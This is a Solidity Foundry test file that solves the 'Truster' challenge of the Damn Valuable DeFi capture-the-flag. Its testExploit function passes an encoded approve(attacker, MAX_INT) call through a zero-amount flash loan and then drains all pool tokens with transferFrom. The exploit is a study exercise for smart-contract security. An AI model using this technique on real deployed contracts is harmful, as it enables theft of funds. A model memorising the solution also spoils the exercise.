// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../../src/Contracts/truster/TrusterLenderPool.sol";

contract Truster is Test {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
    uint256 MAX_INT = 115792089237316195423570985008687907853269984665640564039457584007913129639935;

    Utilities internal utils;
    TrusterLenderPool internal trusterLenderPool;
    DamnValuableToken internal dvt;
    address payable internal attacker;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        trusterLenderPool = new TrusterLenderPool(address(dvt));
        vm.label(address(trusterLenderPool), "Truster Lender Pool");

        dvt.transfer(address(trusterLenderPool), TOKENS_IN_POOL);

        assertEq(dvt.balanceOf(address(trusterLenderPool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        bytes memory expl = abi.encodeWithSignature("approve(address,uint256)", attacker, MAX_INT);

        vm.startPrank(attacker);

        trusterLenderPool.flashLoan(0, msg.sender, address(dvt), expl);

        dvt.transferFrom(address(trusterLenderPool), address(attacker), TOKENS_IN_POOL);
        console.log("balance Of pool:", dvt.balanceOf(address(trusterLenderPool)));
        console.log("While balance Of Attacker:", dvt.balanceOf(address(attacker)));

        vm.stopPrank();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvt.balanceOf(address(trusterLenderPool)), 0);
        assertEq(dvt.balanceOf(address(attacker)), TOKENS_IN_POOL);
    }
}
